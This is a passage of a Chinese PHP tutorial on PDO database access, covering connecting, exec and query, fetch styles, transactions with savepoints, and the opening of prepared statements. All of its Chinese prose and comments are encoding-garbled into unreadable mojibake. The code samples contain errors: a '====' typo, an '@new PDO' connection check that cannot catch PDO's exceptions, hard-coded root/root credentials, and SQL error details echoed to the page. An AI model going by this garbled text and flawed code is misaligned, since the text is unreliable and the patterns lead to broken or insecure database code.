·</li><li>$driversï¼šPDOå±æ€§è®¾ç½®ï¼Œæ˜¯å…³è”æ•°ç»„ï¼Œåˆ©ç”¨PDOå†…éƒ¨çš„å¸¸é‡è¿›è¡Œè®¾ç½®</li></ul></li></ul><blockquote><p>æ­¥éª¤</p></blockquote><p>1ã€å®ä¾‹åŒ–PDOå¯¹è±¡ï¼Œå®Œæˆæ•°æ®åº“åˆå§‹åŒ–è®¤è¯</p><p>2ã€æ ¹æ®SQLç±»å‹é€‰æ‹©ä¸åŒçš„æ–¹æ³•æ‰§è¡ŒSQL</p><p>3ã€æ£€æŸ¥SQLå¯èƒ½å­˜åœ¨çš„è¯­æ³•é”™è¯¯</p><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€å®ä¾‹åŒ–PDOå¯¹è±¡ï¼Œå®Œæˆåˆå§‹åŒ–æ“ä½œ</p><pre><code># æ–¹æ¡ˆ1ï¼šç›´æ¥å†™å…¥æ•°æ®è¿›è¡Œæ•°æ®åº“åˆå§‹åŒ–$pdo = new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2;charset=utf8&apos;,&apos;root&apos;,&apos;root&apos;);# æ–¹æ¡ˆ2ï¼šåˆ©ç”¨å˜é‡ä¿å­˜æ•°æ®æ¥å®ç°æ•°æ®åº“åˆå§‹åŒ–ï¼ˆæ•°æ®æ¥æºå¯ä»¥æ˜¯å…¶ä»–é…ç½®æ–‡ä»¶ï¼šå®‰å…¨ï¼‰$dsn = &apos;mysql:host=localhost;dbname=db_2;charset=utf8&apos;;$user = &apos;root&apos;;$pass = &apos;root&apos;;$pdo = new PDO($dsn,$user,$pass);</code></pre><p>2ã€å¾—åˆ°å¯¹è±¡åï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨PDOå¯¹è±¡è°ƒç”¨ç›¸å…³æ–¹æ³•æ‰§è¡ŒSQLæ“ä½œï¼šexecæ‰§è¡Œæ•°æ®è¿”å›SQLï¼Œqueryæ‰§è¡Œæœ‰ç»“æœè¿”å›SQL</p><pre><code># å®ä¾‹åŒ–PDOå¯¹è±¡$pdo = new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2&apos;,&apos;root&apos;,&apos;root&apos;);# å†™æ“ä½œ$sql = &quot;delete from t_28&quot;;        # æ¨¡æ‹ŸSQLæŒ‡ä»¤$rows = $pdo-&gt;exec($sql);        # å¾—åˆ°å—å½±å“çš„è¡Œæ•°ï¼šæ‰§è¡Œå¤±è´¥è¿”å›false# è¯»æ“ä½œ$sql = &quot;select * from t_40&quot;;$stmt = $pdo-&gt;query($sql);        # æˆåŠŸè¿”å›PDOStatementç±»å¯¹è±¡ï¼Œå¤±è´¥å¾—åˆ°false</code></pre><p>3ã€å¦‚æœPDOå¯¹è±¡åœ¨æ‰§è¡ŒSQLæ—¶å‡ºç°é”™è¯¯ï¼Œå³SQLæœ¬èº«æœ‰é”™è¯¯ï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡PDOç±»æä¾›çš„errorCode()å’ŒerrorInfo()</p><pre><code># å®ä¾‹åŒ–PDOå¯¹è±¡$pdo = new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2&apos;,&apos;root&apos;,&apos;root&apos;);# å†™æ“ä½œ$sql = &quot;delete fromt_40&quot;;        # é”™è¯¯SQL$rows = $pdo-&gt;exec($sql);# é”™è¯¯åˆ¤å®šï¼šexecæ–¹æ³•æ‰§è¡Œç»“æœæˆåŠŸä¹Ÿå­˜åœ¨è¿”å›0çš„æƒ…å†µï¼Œé”™è¯¯ä¼šè¿”å›falseï¼Œæ‰€ä»¥è¦åˆ¤å®šæ˜¯å¦æ˜¯SQLé”™è¯¯ï¼Œéœ€è¦åˆ¤å®šç»“æœä¸ºfalseif(false === $rows){    # å–å‡ºé”™è¯¯ç»†ä¿¡æ¯    echo &apos;SQLé”™è¯¯ï¼š&lt;br/&gt;&apos;;    echo &apos;é”™è¯¯ä»£ç ä¸ºï¼š&apos; . $pdo-&gt;errorCode() . &apos;&lt;br/&gt;&apos;;    echo &apos;é”™è¯¯åŸå› ä¸ºï¼š&apos; . $pdo-&gt;errorInfo()[2];                # errorInfoè¿”å›æ•°ç»„ï¼Œ2ä¸‹æ ‡ä»£è¡¨é”™è¯¯å…·ä½“ä¿¡æ¯    exit;            # é”™è¯¯ä¸éœ€è¦ç»§ç»­æ‰§è¡Œä»£ç }</code></pre><blockquote><p>å°ç»“</p></blockquote><p>1ã€PDOæ˜¯ä¸€ç§å¤–éƒ¨æä¾›çš„æ‰©å±•ï¼Œå¯ä»¥é€šè¿‡æ“ä½œæ‰‹å†Œæ¥ååŠ©å­¦ä¹ ä½¿ç”¨</p><p>2ã€PDOç±»ä¸»è¦ç”¨æ¥å®ç°æ•°æ®åº“çš„åˆå§‹åŒ–æ“ä½œå’ŒSQLæŒ‡ä»¤çš„æ‰§è¡Œ</p><p>3ã€ SQLæ‰§è¡Œçš„ç»“æœä¸è®ºæ˜¯å†™æ“ä½œè¿˜æ˜¯è¯»æ“ä½œéƒ½æœ‰å¯èƒ½å‡ºé”™ï¼Œå› æ­¤éœ€è¦è¿›è¡Œé”™è¯¯å¤„ç†</p><h3 id="3ã€PDOå†™æ“ä½œ"><a href="#3ã€PDOå†™æ“ä½œ" class="headerlink" title="3ã€PDOå†™æ“ä½œ"></a><strong>3ã€PDOå†™æ“ä½œ</strong></h3><blockquote><p>ç›®æ ‡ï¼šåˆ©ç”¨PDOç±»å®Œæˆä¸€ä¸ªå®Œæ•´çš„å†™æ“ä½œå®ç°</p></blockquote><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>å†™æ“ä½œ</strong>ï¼šå³åˆ©ç”¨PDOå®ç°æ•°æ®åº“å¢åˆ æ”¹æ“ä½œ</p><ul><li>æ“ä½œè¿‡ç¨‹ä¸­è¦è€ƒè™‘åˆ°SQLæœ¬èº«å¯èƒ½å‡ºç°çš„é”™è¯¯å¤„ç†ï¼Œä»¥åŠå¯¹ç»“æœçš„æ“ä½œå¤„ç†</li><li>å¾ˆå¤šä»£ç çš„æ‰§è¡Œéƒ½éœ€è¦è¿›è¡Œé”™è¯¯æ£€æŸ¥ï¼Œå¯ä»¥å¯¹ä»£ç è¿›è¡Œå°è£…å¤„ç†</li></ul><blockquote><p>æ­¥éª¤</p></blockquote><p>1ã€åˆå§‹åŒ–è¿æ¥èµ„æº</p><p>2ã€ç»„ç»‡SQLå¹¶æ‰§è¡Œ</p><p>3ã€æ£€æŸ¥SQLæ‰§è¡Œç»“æœï¼Œåˆ¤å®šè¯­æ³•é”™è¯¯</p><p>4ã€è¿”å›å—å½±å“çš„è¡Œæ•°ï¼ˆå¿…è¦æ—¶è¿”å›è‡ªå¢é•¿IDï¼‰</p><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€åˆå§‹åŒ–PDOï¼Œæ¯æ¬¡æ“ä½œéƒ½éœ€è¦ç”¨åˆ°PDOå®ä¾‹åŒ–ï¼šå°è£…æ‰§è¡Œ</p><pre><code># åˆå§‹åŒ–PDOï¼šå¢åŠ é”™è¯¯æŠ‘åˆ¶ç¬¦ï¼Œä¸€è‡´åœ¨åˆå§‹åŒ–è¿‡ç¨‹å¯èƒ½å‡ºç°çš„é”™è¯¯ï¼ˆä¿¡æ¯ä¸å¯¹è¿æ¥ä¸ä¸Šï¼‰function pdo_init(){    $pdo = @new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2;charset=utf8&apos;,&apos;root&apos;,&apos;root&apos;);    if(!$pdo){        exit(&apos;æ•°æ®åº“è¿æ¥è®¤è¯å¤±è´¥ï¼&apos;);    }    # è¿”å›å¾—åˆ°çš„PDOå¯¹è±¡    return $pdo;}</code></pre><p>â€‹    </p><p>2ã€SQLé€šå¸¸åº”è¯¥æ˜¯å¤–éƒ¨ä¼ å…¥ï¼Œå¤–éƒ¨éœ€è¦çš„åªæ˜¯ç»“æœï¼Œä¸è€ƒè™‘è¿‡ç¨‹ï¼Œæ‰€ä»¥åœ¨å®é™…å¼€å‘æ—¶è¦è€ƒè™‘äºŒæ¬¡å°è£…ã€‚å³å¤–éƒ¨ä¼ å…¥SQLï¼Œå†…éƒ¨æ‰§è¡Œå¹¶æ§åˆ¶é”™è¯¯ï¼Œæœ€ç»ˆè¿”å›ç»“æœ</p><pre><code># å°è£…æ‰§è¡Œï¼šå‡½æ•°å°è£…éœ€è¦ä¼ å…¥PDOå¯¹è±¡ï¼ˆä¹Ÿå¯ä»¥åœ¨å‡½æ•°å†…éƒ¨å®ä¾‹åŒ–å¯¹è±¡ï¼‰function pdo_exec($pdo,$sql){    # è°ƒç”¨PDOå¯¹è±¡çš„æ–¹æ³•æ‰§è¡Œå†™SQL    $res = $pdo-&gt;exec($sql);    # é”™è¯¯åˆ¤å®š    if(false === $res){        # å–å‡ºé”™è¯¯ç»†ä¿¡æ¯ï¼šå®é™…å¼€å‘æ˜¯å°†é”™è¯¯ä¿¡æ¯è®°å½•åˆ°ç³»ç»Ÿæ—¥å¿—ä¸­ï¼Œè¿”å›false        echo &apos;SQLé”™è¯¯ï¼š&lt;br/&gt;&apos;;        echo &apos;é”™è¯¯ä»£ç ä¸ºï¼š&apos; . $pdo-&gt;errorCode() . &apos;&lt;br/&gt;&apos;;        echo &apos;é”™è¯¯åŸå› ä¸ºï¼š&apos; . $pdo-&gt;errorInfo()[2];                    exit;    }    # è¿”å›æ‰§è¡Œç»“æœï¼šå—å½±å“çš„è¡Œæ•°ï¼ˆç›´æ¥æ˜¯å—å½±å“çš„è¡Œæ•°ï¼‰    return $res;}</code></pre><p>3ã€å…·ä½“å®ç°å†™æ“ä½œ</p><pre><code># å¼•å…¥æ–‡ä»¶ï¼šå°è£…çš„PDOæ–‡ä»¶include &apos;pdo.php&apos;;            # å‡è®¾æ‰€æœ‰å°è£…éƒ½æ”¾åˆ°äº†pdo.phpä¸­# åˆå§‹åŒ–$pdo = pdo_init();# ç»„ç»‡è¦æ‰§è¡Œçš„SQL$sql = &apos;delete from t_29&apos;;$res = pdo_exec($pdo,$sql);# ç»“æœä½¿ç”¨echo &apos;æœ¬æ¬¡æ“ä½œå…±å®ç°æ•°æ®åº“æ“ä½œï¼š&apos; . $res . &apos;æ¡è®°å½•ï¼&apos;;</code></pre><p><strong>æ³¨æ„</strong>ï¼šä¸€èˆ¬å†™æ“ä½œéƒ½æ˜¯å—å½±å“è¡Œæ•°ï¼Œä½†æ˜¯å¦‚æœæ˜¯æ’å…¥æ“ä½œï¼Œæœ‰æ—¶å€™éœ€è¦æ–°å¢è®°å½•çš„è‡ªå¢é•¿IDï¼Œå¯ä»¥é€šè¿‡PDO::lastInsertId()æ¥è·å–</p><pre><code># æ¥ä¸Šè¿°ä»£ç $id = $pdo-&gt;lastInsertId();    # å®é™…å¼€å‘ä¹Ÿåº”å°è£…echo &apos;æ–°å¢æˆåŠŸï¼æ–°å¢çš„IDä¸ºï¼š&apos; . $id;</code></pre><blockquote><p>å°ç»“</p></blockquote><p>1ã€å®é™…ä½¿ç”¨PDOçš„æ—¶å€™ï¼Œéƒ½ä¼šè¿›è¡ŒäºŒæ¬¡å°è£…ï¼Œå› ä¸ºPDOçš„æ“ä½œæœ‰å¾ˆå¤šæœ¬èº«ä¸å¤Ÿå®Œå–„</p><p>2ã€PDOç±»å¯ä»¥ç‹¬ç«‹å®Œæˆå†™æ“ä½œåŠŸèƒ½ï¼Œè€Œä¸éœ€è¦ä½¿ç”¨å…¶ä»–ä¸¤ä¸ªå·¥å…·ç±»</p><p>3ã€PDOçš„å†™æ“ä½œå…¶å®æœ¬è´¨è¦æ³¨æ„çš„æ˜¯æ‰§è¡ŒSQLæ—¶å¯èƒ½å‡ºç°çš„é”™è¯¯å¤„ç†</p><p>4ã€å†™æ“ä½œä¸­å”¯ä¸€ä¸åŒçš„æ˜¯æ’å…¥æ“ä½œï¼Œå› ä¸ºå¯èƒ½éœ€è¦è·å–è‡ªå¢é•¿IDï¼Œæ­¤æ—¶éœ€è¦å¤šä¸€ä¸ªæ­¥éª¤ï¼ˆåŠŸèƒ½ï¼‰</p><h3 id="4ã€PDOæŸ¥è¯¢æ“ä½œ"><a href="#4ã€PDOæŸ¥è¯¢æ“ä½œ" class="headerlink" title="4ã€PDOæŸ¥è¯¢æ“ä½œ"></a><strong>4ã€PDOæŸ¥è¯¢æ“ä½œ</strong></h3><blockquote><p>ç›®æ ‡ï¼šæŒæ¡PDOå¯¹æŸ¥è¯¢æ“ä½œçš„å®ç°ï¼Œç†è§£ç±»ä¸­äº§ç”Ÿå…¶ä»–ç±»å¯¹è±¡çš„åŸç†ï¼Œå®ç°æ•°æ®åº“çš„æŸ¥è¯¢æ“ä½œ</p></blockquote><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>æŸ¥è¯¢æ“ä½œ</strong>ï¼šé€šè¿‡æ‰§è¡ŒSQLæŒ‡ä»¤åä»æ•°æ®åº“è·å¾—ç›¸åº”çš„æ•°æ®ï¼Œç„¶åå¯¹æ•°æ®åŠ å·¥å˜æˆphpå¯è¯†åˆ«çš„æ ¼å¼</p><ul><li><p>PDO::query()æ–¹æ³•åªèƒ½æ‰§è¡ŒSQLï¼Œå¹¶ä¸èƒ½ç›´æ¥è§£æç»“æœï¼Œè¿”å›ä¸€ä¸ªPDOStatementç±»å¯¹è±¡</p></li><li><p>PDOStatement::fetch()ç³»åˆ—æ–¹æ³•ä»å¯¹è±¡ä¸­å®ç°æ•°æ®è·å–</p><ul><li>fetchï¼šè·å–ä¸€æ¡è®°å½•</li><li>fetchAllï¼šè·å–å…¨éƒ¨è®°å½•</li></ul></li><li>FETCH_STYLEï¼šé€šè¿‡å¸¸é‡è®¾è®¡çš„æ–¹å¼å®ç°è·å–æ•°æ®çš„ä¸åŒæ•ˆæœ</li></ul><blockquote><p>æ­¥éª¤</p></blockquote><p>1ã€åˆå§‹åŒ–æ•°æ®åº“è¿æ¥</p><p>2ã€ç»„ç»‡SQLæŒ‡ä»¤å¹¶é€šè¿‡PDO::query()æ‰§è¡Œ</p><p>3ã€æ£€æŸ¥å¯èƒ½å‡ºç°çš„SQLè¯­æ³•é”™è¯¯</p><p>4ã€é€šè¿‡PDOStatementç±»æŒ‰ç…§å…·ä½“éœ€æ±‚å®ç°æ•°æ®è§£æ</p><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€æŸ¥è¯¢æ˜¯å»ºç«‹åœ¨è¿æ¥ä¹‹ä¸Šï¼Œå› æ­¤éœ€è¦ä½¿ç”¨åˆ°å‰é¢å°è£…çš„åˆå§‹åŒ–åŠŸèƒ½</p><pre><code>function pdo_init(){    $pdo = @new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2&apos;,&apos;root&apos;,&apos;root&apos;);    if(!$pdo){        exit(&apos;æ•°æ®åº“è¿æ¥è®¤è¯å¤±è´¥ï¼&apos;);    }    # è¿”å›å¾—åˆ°çš„PDOå¯¹è±¡    return $pdo;}</code></pre><p>2ã€æŸ¥è¯¢çš„SQLä¹Ÿæ˜¯å¯èƒ½å‡ºç°é—®é¢˜çš„éƒ¨åˆ†ï¼Œå› æ­¤åŒæ ·éœ€è¦è¿›è¡Œé”™è¯¯æ£€æŸ¥ï¼šå¦å¤–PDOæŸ¥è¯¢ä½¿ç”¨çš„æ˜¯PDO::query()æ–¹æ³•å®ç°</p><pre><code>function pdo_query($pdo,$sql){    # è°ƒç”¨PDOå¯¹è±¡çš„æ–¹æ³•æ‰§è¡Œè¯»SQL    $stmt = $pdo-&gt;query($sql);    # é”™è¯¯åˆ¤å®š    if(false === $stmt){        # å–å‡ºé”™è¯¯ç»†ä¿¡æ¯        echo &apos;SQLé”™è¯¯ï¼š&lt;br/&gt;&apos;;        echo &apos;é”™è¯¯ä»£ç ä¸ºï¼š&apos; . $pdo-&gt;errorCode() . &apos;&lt;br/&gt;&apos;;        echo &apos;é”™è¯¯åŸå› ä¸ºï¼š&apos; . $pdo-&gt;errorInfo()[2];                    exit;    }    # è¿”å›æ‰§è¡Œç»“æœï¼šPDOStatementç±»å¯¹è±¡    return $stmt;}</code></pre><p>3ã€æ­¤æ—¶æŸ¥è¯¢å‡ºæ¥çš„ç»“æœæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œä¸èƒ½æä¾›ä»»ä½•phpå¯è®¿é—®çš„æ•°æ®ç»“æœï¼Œè¿˜éœ€è¦å¯¹ç»“æœè¿›è¡Œå¤„ç†ã€‚è€Œæˆ‘ä»¬æŸ¥è¯¢æ•°æ®çš„æ—¶å€™é€šå¸¸æ˜¯ä¸¤ç§æ“ä½œï¼šæ ¹æ®å…·ä½“æ¡ä»¶è·å–ä¸€æ¡è®°å½•æˆ–è€…å¤šæ¡è®°å½•ï¼Œå› æ­¤è¿”å›çš„æ•°æ®æ˜¯ä¸åŒçš„ã€‚è§£å†³æ–¹æ¡ˆä¹Ÿæœ‰å¤šç§æ–¹å¼ï¼š</p><ul><li>â‘ åˆ›å»ºå¤šä¸ªå‡½æ•°æ¥å®ç°ä¸åŒæ•ˆæœ</li><li><p>â‘¡åˆ›å»ºä¸€ä¸ªå‡½æ•°ï¼Œä½†æ˜¯é€šè¿‡å‚æ•°æ¥æ§åˆ¶å®ç°ä¸åŒæ•ˆæœ</p><p>function pdo_get($stmt,$only = true){</p><pre><code># $stmtæ˜¯PDOæŸ¥è¯¢å¾—åˆ°çš„å¯¹è±¡ï¼Œ$onlyä»£è¡¨é»˜è®¤åªè·å–ä¸€æ¡è®°å½•# å®‰å…¨åˆ¤å®šif(!$stmt instanceof PDOStatement) return false;# PDOStatementç±»ä¸­æä¾›äº†ä¸¤ç§æ–¹æ³•åˆ†åˆ«å»è·å–ä¸€æ¡å’Œå¤šæ¡è®°å½•# åˆ¤å®šæ¡ä»¶if($only){    # è·å–ä¸€æ¡è®°å½•PDOStatement::fetch()ï¼šè¿”å›ä¸€ç»´æ•°ç»„    return $stmt-&gt;fetch();}else{    # è·å–å¤šæ¡è®°å½•PDOStatement::fetchAll()ï¼šè¿”å›äºŒç»´æ•°ç»„ï¼Œä¸€ä¸ªç»´åº¦ä»£è¡¨ä¸€æ¡è®°å½•    return $stmt-&gt;fetchAll();}</code></pre><p>}</p></li></ul><p>4ã€æ­¤æ—¶ä»åŠŸèƒ½ä¸Šæ¥è®²ï¼Œåªè¦é¡ºåºè°ƒç”¨ä»¥ä¸Šå‡ ä¸ªæ–¹æ³•å³å¯å®Œæˆ</p><pre><code>$pdo = pdo_init();            # åˆå§‹åŒ–# æŸ¥è¯¢$sql = &apos;select * from t_40 where æ¡ä»¶&apos;;$stmt = pdo_query($pdo,$sql);# è·å–ä¸€æ¡è®°å½•$row = pdo_get($stmt);# è·å–å¤šæ¡è®°å½•$rows = pdo_get($stmt,false);</code></pre><p>5ã€fetchç³»åˆ—æ–¹æ³•é»˜è®¤è¿”å›çš„æ•°æ®æ˜¯é‡å¤çš„ï¼šæ•°æ®çš„ç´¢å¼•æ–¹å¼å’Œå…³è”æ–¹å¼å„å‡ºç°ä¸€æ¬¡ï¼Œè€Œå®é™…åœ¨è¿›è¡Œå¼€å‘æ•°æ®å±•ç¤ºæ—¶é€šå¸¸æ˜¯é€šè¿‡æ•°æ®è¡¨å­—æ®µåå­—ä½œä¸ºä¸‹æ ‡è¿›è¡Œæ•°æ®æŸ¥çœ‹ï¼Œæ‰€ä»¥æ­¤æ—¶å¯ä»¥é€šè¿‡è®¾å®šfetchç³»åˆ—çš„æ¡ä»¶fetch_styleæ¥å®ç°</p><p>[å¤–é“¾å›¾ç‰‡è½¬å­˜å¤±è´¥,æºç«™å¯èƒ½æœ‰é˜²ç›—é“¾æœºåˆ¶,å»ºè®®å°†å›¾ç‰‡ä¿å­˜ä¸‹æ¥ç›´æ¥ä¸Šä¼ (img-A20W0ws7-1589898970684)(æ•ˆæœå›¾\PDOçš„fetchæ–¹å¼.png)]</p><p>å¯ä»¥æ ¹æ®ç³»ç»Ÿæä¾›çš„æ–¹å¼æ¥ä¿®æ”¹pdo_getå‡½æ•°ï¼Œåœ¨åé¢å†å¢åŠ ä¸€ä¸ªé»˜è®¤å‚æ•°å³å¯</p><pre><code>function pdo_get($stmt,$only = true,$fetch_style = PDO::FETCH_ASSOC){    # fetch_styleé»˜è®¤ä½¿ç”¨å…³è”æ•°ç»„è¿”å›    # åˆ¤å®šæ¡ä»¶    if($only){        # è·å–ä¸€æ¡è®°å½•PDOStatement::fetch()ï¼šè¿”å›ä¸€ç»´æ•°ç»„        return $stmt-&gt;fetch($fetch_style);    }else{        # è·å–å¤šæ¡è®°å½•PDOStatement::fetchAll()ï¼šè¿”å›äºŒç»´æ•°ç»„ï¼Œä¸€ä¸ªç»´åº¦ä»£è¡¨ä¸€æ¡è®°å½•        return $stmt-&gt;fetchAll($fetch_style);    }}</code></pre><blockquote><p>å°ç»“</p></blockquote><p>1ã€æŸ¥è¯¢æ“ä½œæ˜¯é€šè¿‡PDO::query()æ‰§è¡ŒæŸ¥è¯¢SQLå¾—åˆ°PDOStatementå¯¹è±¡ï¼Œç„¶åPDOStatementå¯¹è±¡ä¸‹æœ‰ä¸€ç³»åˆ—fetchæ–¹æ³•å¯ä»¥å®ç°æ•°æ®æŸ¥è¯¢ï¼Œå¾—åˆ°phpå¯ä»¥è¯†åˆ«çš„æ•°ç»„æ•°æ®</p><p>2ã€PDOå®ç°æŸ¥è¯¢é€šå¸¸ä¹Ÿéœ€è¦è¿›è¡ŒäºŒæ¬¡å°è£…ï¼Œä¿è¯SQLæ‰§è¡Œå®‰å…¨ï¼Œä¹Ÿæ–¹ä¾¿ç”¨æˆ·è·å–ç›®æ ‡æ•°æ®</p><h3 id="5ã€PDOäº‹åŠ¡åŠŸèƒ½"><a href="#5ã€PDOäº‹åŠ¡åŠŸèƒ½" class="headerlink" title="5ã€PDOäº‹åŠ¡åŠŸèƒ½"></a><strong>5ã€PDOäº‹åŠ¡åŠŸèƒ½</strong></h3><blockquote><p>ç›®æ ‡ï¼šæŒæ¡PDOå¯¹äºMySQLäº‹åŠ¡çš„å°è£…ï¼Œèƒ½å¤Ÿåˆ©ç”¨PDOå®ç°äº‹åŠ¡æ“ä½œéœ€æ±‚</p></blockquote><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>PDOäº‹åŠ¡åŠŸèƒ½</strong>ï¼šå¹¶éPDOé¢å¤–å¤šå‡ºäº†ä¸€é¡¹åŠŸèƒ½ï¼Œè€Œæ˜¯å°†åŸæ¥MySQLæ‰€æ”¯æŒçš„äº‹åŠ¡æ“ä½œè¿›è¡Œäº†ä¸€å®šçš„å°è£…å®ç°</p><ul><li>äº‹åŠ¡æ‰§è¡Œæ˜¯å¦æˆåŠŸæ˜¯ç”±MySQLå¯¹åº”çš„å­˜å‚¨å¼•æ“ï¼ˆInnoDBæ”¯æŒï¼‰æ˜¯å¦æ”¯æŒå†³å®šçš„</li><li>PDOåªæ˜¯å¯¹å…·ä½“çš„æ“ä½œæ­¥éª¤è¿›è¡Œäº†å°è£…è€Œå·²<ul><li>PDO::beginTransaction()ï¼šå¼€å¯äº‹åŠ¡</li><li>PDO::exec()ï¼šæ‰§è¡Œäº‹åŠ¡ï¼ˆå†™æ“ä½œï¼‰</li><li>PDO::rollBack()ï¼šå›æ»šæ‰€æœ‰äº‹åŠ¡</li><li>PDO::commit()ï¼šæˆåŠŸæäº¤æ‰€æœ‰äº‹åŠ¡</li></ul></li></ul><blockquote><p>æ­¥éª¤</p></blockquote><p>1ã€åˆå§‹åŒ–æ•°æ®åº“æ“ä½œ</p><p>2ã€å¼€å¯äº‹åŠ¡</p><p>3ã€æ‰§è¡Œäº‹åŠ¡</p><p>4ã€æ ¹æ®ç»“æœé€‰æ‹©å¯¹äº‹åŠ¡æ“ä½œçš„å¤„ç†</p><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€äº‹åŠ¡æ“ä½œçš„åŸºæœ¬å®ç°</p><pre><code># å®ä¾‹åŒ–PDOå¯¹è±¡$pdo = new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2;charset=utf8&apos;,&apos;root&apos;,&apos;root&apos;);# å¼€å¯äº‹åŠ¡$pdo-&gt;beginTransaction() or die(&apos;äº‹åŠ¡å¼€å¯å¤±è´¥&apos;);/*    # PDOç±»å†…éƒ¨    public function beginTransaction(){        $sql = &apos;start transaction&apos;;        # å†™æ–¹æ³•æ‰§è¡Œ        $res = $this-&gt;exec($sql);        # åˆ¤å®šç»“æœ        if($res === false) return false;        return true;    }*/# æ‰§è¡Œäº‹åŠ¡$pdo-&gt;exec(&apos;insert into t_40 values()&apos;);# è¿ç»­æ“ä½œ# ç»ˆæ­¢äº‹åŠ¡ï¼šåˆ¤å®šç»“æœ$pdo-&gt;commit();                # æˆåŠŸæäº¤$pdo-&gt;rollback();            # å¤±è´¥å›æ»š</code></pre><p>2ã€åœ¨äº‹åŠ¡æ“ä½œä¸­ï¼Œæœ‰ä¸€ç§å›æ»šç‚¹æœºåˆ¶ï¼Œåœ¨PDOä¸­æ²¡æœ‰å®ç°ï¼Œå¦‚æœæœ‰å¿…è¦ï¼Œå¯ä»¥é€šè¿‡SQLæŒ‡ä»¤è®¾ç½®æ¥å®ç°</p><pre><code># å®ä¾‹åŒ–PDOå¯¹è±¡$pdo = new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2&apos;,&apos;root&apos;,&apos;root&apos;);# å¼€å¯äº‹åŠ¡$pdo-&gt;beginTransaction() or die(&apos;äº‹åŠ¡å¼€å¯å¤±è´¥&apos;);# æ‰§è¡Œäº‹åŠ¡$pdo-&gt;exec(&apos;insert into t_40 values()&apos;);# è®¾ç½®å›æ»šç‚¹$pdo-&gt;exec(&apos;savepoint sp1&apos;);/*    # å°è£…è®¾ç½®å›æ»šç‚¹çš„å‡½æ•°    function savepoint($pdo,$name){        $sql = &quot;savepoint {$name}&quot;;        # æ‰§è¡Œ        $res = $pdo-&gt;exec($sql);        # åˆ¤å®šç»“æœ        return $res ==== false ? false : true;    }*/# ç»§ç»­æ‰§è¡Œäº‹åŠ¡...# å›æ»š$pdo-&gt;exec(&apos;rollback to sp1&apos;);# ç»ˆæ­¢äº‹åŠ¡$pdo-&gt;commit();                # æˆåŠŸæäº¤$pdo-&gt;rollback();            # å¤±è´¥å›æ»š</code></pre><blockquote><p>å°ç»“</p></blockquote><p>1ã€äº‹åŠ¡çš„æœ¬è´¨æ˜¯ç”±æ—¢å®šSQLæŒ‡ä»¤å®Œæˆï¼Œè€Œäº‹åŠ¡å…·ä½“æ“ä½œå†…å®¹ä¸€å®šæ˜¯å¤–éƒ¨æŒ‡å®šçš„SQLï¼ˆå†™æ“ä½œï¼‰æ¥å¤„ç†</p><p>2ã€PDOæä¾›äº†äº‹åŠ¡å›ºå®šå†…å®¹çš„å°è£…ï¼ŒåŒ…æ‹¬å¼€å¯äº‹åŠ¡ï¼ˆPDO::beginTransaction()ï¼‰å’Œäº‹åŠ¡ç»ˆæ­¢ï¼ˆPDO::commit()å’ŒPDO::rollback()ï¼‰</p><p>3ã€å›æ»šç‚¹å¯ä»¥é€šè¿‡PDO::exec()æ–¹æ³•æ¥è®¾å®šå’Œå›æ»š</p><p>4ã€å¦‚æœä¸é‡‡ç”¨PDOçš„äº‹åŠ¡æœºåˆ¶ï¼Œä¹Ÿå¯ä»¥å®Œå…¨åˆ©ç”¨PDO::exec()æ¥å®ç°</p><ul><li>PDO::exec(â€˜start transactionâ€™)ï¼šå¼€å¯äº‹åŠ¡</li><li>PDO::exec(â€˜commitâ€™)ï¼šæäº¤äº‹åŠ¡</li><li>PDO::exec(â€˜rollbackâ€™)ï¼šå›æ»šäº‹åŠ¡</li></ul><h3 id="6ã€PDOé¢„å¤„ç†"><a href="#6ã€PDOé¢„å¤„ç†" class="headerlink" title="6ã€PDOé¢„å¤„ç†"></a><strong>6ã€PDOé¢„å¤„ç†</strong></h3><blockquote><p>ç›®æ ‡ï¼šæŒæ¡PDOå¯¹äºMySQLé¢„å¤„ç†çš„æ”¯æŒï¼Œèƒ½å¤Ÿåˆ©ç”¨PDOå®ç°é¢„å¤„ç†æ“ä½œ</p></blockquote><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>PDOé¢„å¤„ç†</strong>ï¼šæ˜¯PDOå°è£…ä¸€å¥—ç‰¹å®šçš„æ–¹æ³•ï¼Œåœ¨æ–¹æ³•ä¸­åšäº†ä¸€äº›ä¼˜åŒ–æ“ä½œï¼Œä½¿å¾—å¼€å‘äººå‘˜å¯ä»¥ä¾¿æ·çš„ç”¨æ¥å®ç°é¢„å¤„ç†</p><ul><li><p>PDOé¢„å¤„ç†çš„å®ç°æ˜¯åŸºäºMySQLé¢„å¤„ç†æœºåˆ¶ï¼Œåªæ˜¯é’ˆå¯¹é¢„å¤„ç†çš„æ“ä½œè¿‡ç¨‹è¿›è¡Œäº†å†…éƒ¨å°è£…</p><ul><li>å‚æ•°å¤„ç†ï¼šå¯ä»¥ä½¿ç”¨åŸå ä½ç¬¦<code>?</code>ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨PDOå ä½ç¬¦<code>:åå­—</code></li></ul></li><li><p>PDOä¸­é¢„å¤„ç†æä¾›äº†ä¸€å¥—æ–¹æ³•æœºåˆ¶ï¼Œä¸»è¦ç”±ä»¥ä¸‹å‡ ä¸ªæ–¹æ³•ç»„æˆ</p><ul><li>PDO::prepare()ï¼šå‘é€é¢„å¤„ç†æŒ‡ä»¤ï¼Œåªéœ€è¦æä¾›è¦æ‰§è¡Œçš„æŒ‡ä»¤å³å¯ï¼Œä¸éœ€è¦prepare åå­— 